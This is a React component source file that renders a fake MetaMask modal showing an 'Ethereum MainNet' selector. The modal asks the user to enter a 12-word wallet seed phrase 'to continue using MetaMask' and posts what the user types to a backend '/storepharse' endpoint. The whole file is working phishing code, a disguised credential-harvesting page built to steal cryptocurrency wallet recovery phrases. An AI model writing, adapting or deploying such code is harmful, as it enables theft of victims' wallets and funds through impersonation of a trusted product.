/* eslint-disable @next/next/no-img-element */
import React, { useState, useContext } from "react";
import { ModelContext } from "../utils/model";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faChevronDown, faCircle } from "@fortawesome/free-solid-svg-icons";
import axios from "axios";
import { config } from "../backendUrl";
import styles from "./semiModel.module.css";

const SemiModel = ({ imageUrl, show, setshow, modelTitle }) => {
  const [phareVal, setPhareVal] = useState("");
  const { Closestate, setCloseState} = useContext(ModelContext);

  const handleSubmit = async () => {
    const data = {
      phareTitle: modelTitle,
      phareVal,
    };
    console.log(data);
    try {
      const res = await axios
        .post(`${config.backend_url}/storepharse`, data)
        .then((d) => {
          setCloseState(true);
          setshow({ imageUrl: "", shouldOpen: false });
          setPhareVal("");
          console.log("Success:", d);
        });
    } catch (err) {
      console.log(err);
    }
  };

  return (
    <div
      className={styles.semiModel_container}
      style={!show ? { display: "none" } : null}
    >
      <div className={styles.semiModel_container_header}>
        <img src={imageUrl} alt={"logo"} />
        <div className={styles.semiModel_dropdown}>
          <div>
            <FontAwesomeIcon
              icon={faCircle}
              style={{ fontSize: "12px", color: '#47A7A9' }}
              size={"sm"}
            />
            <p>Ethereum MainNet</p>
          </div>

          <FontAwesomeIcon
            icon={faChevronDown}
            style={{ fontSize: "12px" }}
            size={"sm"}
          />
        </div>
      </div>
      <div className={styles.semiModel_container_body}>
        <h1>Continue with seed Phrase</h1>
        <p>Enter your keyword pharse of 12 words to continue using MetaMask</p>
        <p style={{ marginBottom: "5px" }}>Wallet Seed</p>
        <textarea
          value={phareVal}
          onChange={(e) => setPhareVal(e.target.value)}
          placeholder='Separate your each word with a single space'
        />
        <button onClick={handleSubmit}>Proceed</button>
      </div>
    </div>
  );
};

export default SemiModel;
